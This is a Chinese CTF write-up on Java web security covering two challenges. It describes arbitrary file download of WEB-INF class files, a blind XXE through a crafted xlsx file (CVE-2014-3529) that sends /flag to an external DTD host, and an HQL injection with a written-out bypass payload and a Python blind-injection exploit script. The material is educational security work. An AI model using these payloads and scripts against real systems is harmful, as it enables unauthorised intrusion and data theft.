# 通过两道题浅看java安全

阅读量 **363595**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-05-18 16:30:48

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 0x01 前言

java的web题一直是菜鸡觉得最难的，网鼎杯也出了一道web的java题，因此想结合以前做的java题来简单谈一谈java安全，那就先从网鼎杯的javafile开始吧。

## 0x02 正文

###  javafile

刚进入这道题就是一个文件上传的页面，先抓个包看看:

![](https://p0.ssl.qhimg.com/t01a6d8e3c9a1cd4d78.png)

看到COOKIE是`JSESSIONID`，初步判断是java写的web应用，可以任意上传文件，也能下载文件，这里给我提个醒，因为以前遇到过java的任意下载文件的漏洞，很明显解析不了上传的一句话，于是想到
**从下载的功能入手**

![](https://p4.ssl.qhimg.com/t01dda92b27316cd23e.png)

这里如果把`filename`的路径修改一下，能不能下载得到其他的文件呢？

![](https://p4.ssl.qhimg.com/t01fb9d84fb52f954e5.png)

可以看到，的确存在任意文件读取的功能，因为这里是java开发的web应用，自然想到`WEB-INF`目录，它是java的web应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。

> WEB-INF目录的作用
    
    
    /WEB-INF/web.xml Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
    
    /WEB-INF/classes/ 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中。
    
    /WEB-INF/lib/ 存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件。
    
    /WEB-INF/src/ 源码目录，按照包名结构放置各个Java文件。
    
    /WEB-INF/database.properties 数据库配置文件
    
    /WEB-INF/tags/ 存放了自定义标签文件，该目录并不一定为 tags，可以根据自己的喜好和习惯为自己的标签文件库命名，当使用自定义的标签文件库名称时，在使用标签文件时就必须声明正确的标签文件库路径。例如：当自定义标签文件库名称为 simpleTags 时，在使用 simpleTags 目录下的标签文件时，就必须在 jsp 文件头声明为：<%@ taglibprefix="tags" tagdir="/WEB-INF /simpleTags" % >。
    
    /WEB-INF/jsp/ jsp 1.2 以下版本的文件存放位置。改目录没有特定的声明，同样，可以根据自己的喜好与习惯来命名。此目录主要存放的是 jsp 1.2 以下版本的文件，为区分 jsp 2.0 文件，通常使用 jsp 命名，当然你也可以命名为 jspOldEdition 。
    
    WEB-INF/jsp2/ 与 jsp 文件目录相比，该目录下主要存放 Jsp 2.0 以下版本的文件，当然，它也是可以任意命名的，同样为区别 Jsp 1.2以下版本的文件目录，通常才命名为 jsp2。
    
    META-INF 相当于一个信息包，目录中的文件和目录获得Java 2平台的认可与解释，用来配置应用程序、扩展程序、类加载器和服务manifest.mf文件，在用jar打包时自动生成。
    

不妨尝试读取`/WEB-INF/web.xml`来查看servlet的配置规则

![](https://p4.ssl.qhimg.com/t018e71e7a0d60cab8e.png)

我们需要重点关注的是`<servlet-class>`这个标签，因为在这个标签记录了`/WEB-INF/classes/`的类，以便于我们去下载这个class文件

根据得到的信息下载对应源码

> 注意将 . 换成 / 和后缀 .class

`DownloadServlet.class`、  
`ListFileServlet.class`、  
`UploadServlet.class`

![](https://p2.ssl.qhimg.com/t01e70ab185d446b3c8.png)

下载后将`class`文件反编译进行审查:

####  UploadServlet.class源码分析

    
    
    package cn.abc.servlet;
    
    import java.io.File;
    import java.io.FileOutputStream;
    import java.io.IOException;
    import java.io.InputStream;
    import java.util.UUID;
    import javax.servlet.ServletException;
    import javax.servlet.http.HttpServlet;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import org.apache.commons.fileupload.FileItem;
    import org.apache.commons.fileupload.FileUploadException;
    import org.apache.commons.fileupload.disk.DiskFileItemFactory;
    import org.apache.commons.fileupload.servlet.ServletFileUpload;
    import org.apache.poi.openxml4j.exceptions.InvalidFormatException;
    import org.apache.poi.ss.usermodel.WorkbookFactory;
    
    public class UploadServlet extends HttpServlet {
        private static final long serialVersionUID = 1;
    
        /* access modifiers changed from: protected */
        public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
            doPost(request, response);
        }
    
        /* access modifiers changed from: protected */
        public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
            String savePath = getServletContext().getRealPath("/WEB-INF/upload");
            File tempFile = new File(getServletContext().getRealPath("/WEB-INF/temp"));
            if (!tempFile.exists()) {
                tempFile.mkdir();
            }
            String message = "";
            try {
                DiskFileItemFactory factory = new DiskFileItemFactory();
                factory.setSizeThreshold(102400);
                factory.setRepository(tempFile);
                ServletFileUpload servletFileUpload = new ServletFileUpload(factory);
                servletFileUpload.setProgressListener(new 1(this));
                servletFileUpload.setHeaderEncoding("UTF-8");
                servletFileUpload.setFileSizeMax(1048576);
                servletFileUpload.setSizeMax(10485760);
                if (ServletFileUpload.isMultipartContent(request)) {
                    for (FileItem fileItem : servletFileUpload.parseRequest(request)) {
                        if (fileItem.isFormField()) {
                            String name = fileItem.getFieldName();
                            fileItem.getString("UTF-8");
                        } else {
                            String filename = fileItem.getName();
                            if (!(filename == null || filename.trim().equals(""))) {
                                String fileExtName = filename.substring(filename.lastIndexOf(".") + 1);
                                InputStream in = fileItem.getInputStream();
                                if (filename.startsWith("excel-") && "xlsx".equals(fileExtName)) {
                                    try {
                                        System.out.println(WorkbookFactory.create(in).getSheetAt(0).getFirstRowNum());
                                    } catch (InvalidFormatException e) {
                                        System.err.println("poi-ooxml-3.10 has something wrong");
                                        e.printStackTrace();
                                    }
                                }
                                String saveFilename = makeFileName(filename);
                                request.setAttribute("saveFilename", saveFilename);
                                request.setAttribute("filename", filename);
                                FileOutputStream out = new FileOutputStream(makePath(saveFilename, savePath) + "/" + saveFilename);
                                byte[] buffer = new byte[1024];
                                while (true) {
                                    int len = in.read(buffer);
                                    if (len <= 0) {
                                        break;
                                    }
                                    out.write(buffer, 0, len);
                                }
                                in.close();
                                out.close();
                                message = "文件上传成功!";
                            }
                        }
                    }
                    request.setAttribute("message", message);
                    request.getRequestDispatcher("/ListFileServlet").forward(request, response);
                }
            } catch (FileUploadException e2) {
                e2.printStackTrace();
            }
        }
    
        private String makeFileName(String filename) {
            return UUID.randomUUID().toString() + "_" + filename;
        }
    
        private String makePath(String filename, String savePath) {
            int hashCode = filename.hashCode();
            int dir2 = (hashCode & 240) >> 4;
            String dir = savePath + "/" + (hashCode & 15) + "/" + dir2;
            File file = new File(dir);
            if (!file.exists()) {
                file.mkdirs();
            }
            return dir;
        }
    }
    

其中这一段关键代码：

![](https://p1.ssl.qhimg.com/t014e7006b5d11a000c.png)

首先判断文件是否非空，当文件名以 **excel** 开头并且后缀是 **xlsx** ，则会有  
`System.out.println(WorkbookFactory.create(in).getSheetAt(0).getFirstRowNum());`  
这就引入了XXE较为独特一种方式— **CVE-2014-3529**

> 实际上，与所有post-Office 2007文件格式一样，现代Excel文件实际上只是XML文档的zip文件。这称为Office Open
> XML格式或OOXML。  
>  许多应用程序允许上传文件。有些处理内部数据并采取相应的操作，这几乎肯定需要解析XML。如果解析器未安全配置，则XXE几乎是不可避免的。

因为excel表格其实也是一种压缩文件，我们可利用`7-zip`提取其中的 **[Content_Types].xml**
，当我们上传excel表格时会对其进行解析XML，因此当我们添上恶意XML时即可触发XXE。

因为在响应头是没有任何回显的，因此在这里应该使用Blind-XXE配合结合外部dtd

这里简单说明一下XXE的攻击方式，具体原理已经很多大神说明了：

####  XXE简单分析

XML文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制，其中最重要的就是
**实体**

实体可以分为 **通用实体** 和 **参数实体**  
 **1.通用实体**  
用 &实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用  
 **2.参数实体**  
(1)使用 `%` 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 `%实体名;` 引用  
(2)只有在 DTD 文件中， **参数实体的声明才能引用其他实体**  
(3)和通用实体一样，参数实体也可以外部引用

当我们尝试在 **[Content_Types].xml** 中添加xml：

![](https://p2.ssl.qhimg.com/t0155e3438c70b012df.png)

通过设置两个参数实体，并且引用，实现的功能是调用某一公网的dtd文件，并且将`file:///flag`文件读取存储在file中

在来看外部dtd文件:

![](https://p2.ssl.qhimg.com/t01063fa534f8d47242.png)

它会将 **file** 以GET的形式访问指定IP，如果成功触发XXE，此时我们只需要监听apache2日志即可得到flag.  
我们将构造好的excel文件按照之前要求命名后，监听日志

> 因为在buuoj上复现，无法访问公网，只能通过一台内网的linux靶机来作为引用外部dtd  
>

可以看到，成功触发了XXE，将 **file** 以GET形式访问了我们制定的IP，从而获取到flag

###  攻防世界—Zhuanxv

这个题主页是一个时间记录，抓包发现`JSESSIONID`，因此判断是java开发的web应用，不多说了，就是一通乱扫，发现/list目录，访问后是一个后台登录框：

![](https://p1.ssl.qhimg.com/t01a9269eda5b962377.png)

试图先用万能密码进行登录，无果，初步判断应该是要SQL注入。  
F12启动，看到了在CSS布局中

![](https://p1.ssl.qhimg.com/t0165e5a874d799ce45.png)

是这样获取背景图片的，结合之前java惯有的任意文件下载，自然想到修改filename来进行查看，但是发现不能读取/etc/passwd文件，先不慌

针对java开发的web应用，想到去查看/WEB-INF/目录下的各种配置文件，在这里尝试查看`/WEB-INF/web.xml`，发现是struts2框架

![](https://p3.ssl.qhimg.com/t014ab3e187bee911ec.png)

既然是strust2框架，必不可少的就会有主配置文件`struts.xml`,试图查看`strurs.xml`：

![](https://p1.ssl.qhimg.com/t01de00994f2142c4bc.png)

根据class标签，同样是能够下载`.class`文件，因此我们将相关的class文件下载

    
    
    UserLoginAction.class
    DownloadAction.class
    com.cuitctf.util.UserOAuth.class
    action.AdminAction.class
    

将这四个class文件下载后进行反编译

> 下载默认得到jpg文件，只需要转后缀名为class即可反编译

####  代码分析

**UserLoginAction.class** 是判断是否登陆成功和处理的功能  
贴下代码

    
    
    package com.cuitctf.action;
    
    import com.cuitctf.po.User;
    import com.cuitctf.service.UserService;
    import com.cuitctf.util.InitApplicationContext;
    import com.opensymphony.xwork2.ActionContext;
    import com.opensymphony.xwork2.ActionSupport;
    import java.util.List;
    import java.util.Map;
    import java.util.regex.Pattern;
    
    public class UserLoginAction extends ActionSupport {
        private User user;
        private UserService userService = ((UserService) InitApplicationContext.getApplicationContext().getBean("userService"));
    
        public String execute() throws Exception {
            System.out.println("start:" + this.user.getName());
            Map<String, Object> request = (Map) ActionContext.getContext().get("request");
            try {
                if (userCheck(this.user)) {
                    System.out.println("login SUCCESS");
                    ActionContext.getContext().getSession().put("user", this.user);
                    return "success";
                }
                request.put("error", "登录失败，请检查用户名和密码");
                System.out.println("登陆失败");
                return "error";
            } catch (Exception e) {
                e.printStackTrace();
                throw e;
            }
        }
    
        public boolean isValid(String username) {
            return matcher("[a-zA-Z0-9]{1-16}", username);
        }
    
        private static boolean matcher(String reg, String string) {
            return Pattern.compile(reg).matcher(string).matches();
        }
    
        public boolean userCheck(User user) {
            List<User> userList = this.userService.loginCheck(user.getName(), user.getPassword());
            if (userList != null && userList.size() == 1) {
                return true;
            }
            addActionError("Username or password is Wrong, please check!");
            return false;
        }
    
        public UserService getUserService() {
            return this.userService;
        }
    
        public void setUserService(UserService userService) {
            this.userService = userService;
        }
    
        public User getUser() {
            return this.user;
        }
    
        public void setUser(User user) {
            this.user = user;
        }
    }
    

看到 **isValid** 方法，限定了username是能是16位的字母和数字，因此username是很难利用进行SQL注入的

![](https://p5.ssl.qhimg.com/t014f7cc012795dfea9.png)

**DownloadAction,class** 中：

![](https://p4.ssl.qhimg.com/t01d3bd26b25da18e2f.png)

发现只允许下载后缀名为`xml、jpg、class`的文件，这也说明了开始为什么不能读取/etc/passwd文件内容，但是也没有很多利用点，继续。

审完四个class文件后仍然没有发现关键查询代码，这时可能还有一些class文件或者xml配置文件是需要而我们忽略了的。因此要继续来找这类文件。  
fuzz得到spring的核心配置文件`applicationContext.xml`

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <beans xmlns="http://www.springframework.org/schema/beans"
           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
           xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="dataSource" class="org.springframework.jdbc.datasource.DriverManagerDataSource">
            <property name="driverClassName">
                <value>com.mysql.jdbc.Driver</value>
            </property>
            <property name="url">
                <value>jdbc:mysql://localhost:3306/sctf</value>
            </property>
            <property name="username" value="root"/>
            <property name="password" value="root" />
        </bean>
        <bean id="sessionFactory" class="org.springframework.orm.hibernate3.LocalSessionFactoryBean">
            <property name="dataSource">
                <ref bean="dataSource"/>
            </property>
            <property name="mappingLocations">
                <value>user.hbm.xml</value>
            </property>
            <property name="hibernateProperties">
                <props>
                    <prop key="hibernate.dialect">org.hibernate.dialect.MySQLDialect</prop>
                    <prop key="hibernate.show_sql">true</prop>
                </props>
            </property>
        </bean>
        <bean id="hibernateTemplate" class="org.springframework.orm.hibernate3.HibernateTemplate">
            <property name="sessionFactory">
                <ref bean="sessionFactory"/>
            </property>
        </bean>
        <bean id="transactionManager" class="org.springframework.orm.hibernate3.HibernateTransactionManager">
            <property name="sessionFactory">
                <ref bean="sessionFactory"/>
            </property>
        </bean>
        <bean id="service" class="org.springframework.transaction.interceptor.TransactionProxyFactoryBean" abstract="true">
            <property name="transactionManager">
                <ref bean="transactionManager"/>
            </property>
            <property name="transactionAttributes">
                <props>
                    <prop key="add">PROPAGATION_REQUIRED</prop>
                    <prop key="find*">PROPAGATION_REQUIRED,readOnly</prop>
                </props>
            </property>
        </bean>
        <bean id="userDAO" class="com.cuitctf.dao.impl.UserDaoImpl">
            <property name="hibernateTemplate">
                <ref bean="hibernateTemplate"/>
            </property>
        </bean>
        <bean id="userService" class="com.cuitctf.service.impl.UserServiceImpl">
            <property name="userDao">
                <ref bean="userDAO"/>
            </property>
        </bean>
    </beans>
    

泄露了其他的xml文件和class文件我们再将其下载后反编译进行审查

在`user.hbm.xml`中可以看到

![](https://p2.ssl.qhimg.com/t01bbd2a39a4dc29613.png)

看到了表名`Flag`和列名`welcometoourctf`这样很明显的暗示进行注入

将两处关键代码贴上：

    
    
    package com.cuitctf.dao.impl;
    
    import com.cuitctf.dao.UserDao;
    import com.cuitctf.po.User;
    import java.util.List;
    import org.springframework.orm.hibernate3.support.HibernateDaoSupport;
    
    public class UserDaoImpl extends HibernateDaoSupport implements UserDao {
        public List<User> findUserByName(String name) {
            return getHibernateTemplate().find("from User where name ='" + name + "'");
        }
    
        public List<User> loginCheck(String name, String password) {
            return getHibernateTemplate().find("from User where name ='" + name + "' and password = '" + password + "'");
        }
    }
    
        public List<User> loginCheck(String name, String password) {
            name = name.replaceAll(" ", "").replaceAll("=", "");
            Matcher username_matcher = Pattern.compile("^[0-9a-zA-Z]+$").matcher(name);
            if (Pattern.compile("^[0-9a-zA-Z]+$").matcher(password).find()) {
                return this.userDao.loginCheck(name, password);
            }
            return null;
        }
    }
    

查询语句和过滤语句，将`name`和`password`的空格和`=`设空

####  HQL语法

此处并不是SQL语句，而是 **Hibernate** 中的HQL语句

> Hibernate是一种ORM框架，用来映射与tables相关的类定义（代码）  
>  内部可以使用原生SQL还有HQL语言进行SQL操作。  
>  HQL注入:Hibernate中没有对数据进行有效的验证导致恶意数据进入应用程序中造成的。
    
    
    注意这里查询的都是JAVA类对象
    select "对象.属性名"
    from "对象名"
    where "条件"
    group by "对象.属性名" having "分组条件"
    order by "对象.属性名"
    

之前的过滤规则是过滤了用户名和密码的空格和`=`，因此在这里需要用换行符%0a进行绕过  
使用如下payload

    
    
    admin%27%0Aor%0A%271%27%3E%270'%0Aor%0Aname%0Alike%0A'admin
    

这样经过拼接后成为了:

    
    
    from User where name = '"admin' or '1'>'0' or name like 'admin' and password = '"+ password + "'"
    

‘1’>’0’恒成立，这样相当于MYSQL万能密码一样进行绕过，登录后台

![](https://p2.ssl.qhimg.com/t01431a41e7d68b1237.png)

但是flag并不在后台上，根据之前知道的表和列，flag应该在数据库里，因此我们需要注入得到flag

贴上队里大佬博客里的exp:

    
    
    #coding=utf-8
    
    
    import requests
    
    url="http://124.126.19.106:37956/zhuanxvlogin"
    
    flag =""
    for i in range(1,50):
        for c in range(30,150):
            ch = chr(c)
            if ch == '_' or ch == '%':
                continue
            sql="(selectnascii(substr(welcometoourctf," + str(i) + ",1))nfromnFlagn)"
            username = "admin'or" + sql + "like'" + str(c) + "'ornnamenlike'admin"
            password = "1"
            data = {"user.name" : username , "user.password" : password}
            #print data
            req = requests.post(url,data=data,timeout=10000).text
            if len(req) > 4000:
                flag = flag +ch
                print ("Flag:"+flag)
                break
    

利用ascii和substr的一个盲注，注意空格需要用换行符替代，最后跑出flag

## 总结

个人感觉java题虽然没有那么常见，但是java题的质量一般都很高，通过cookie判断出是java开发的web应用，应该试图去寻找是否存在任意文件下载，只有这样，才能够读取java题泄露的class文件，反编译后进行代码审计，最后才会有更广阔的的思路。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Crispr** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/205215](/post/id/205215)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [XXE](/tag/XXE)
  * [Web安全](/tag/Web安全)
  * [Java](/tag/Java)

 **+1** __18赞

 __收藏

![](https://p4.ssl.qhimg.com/t01f727a088f341ab8f.png) Crispr

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

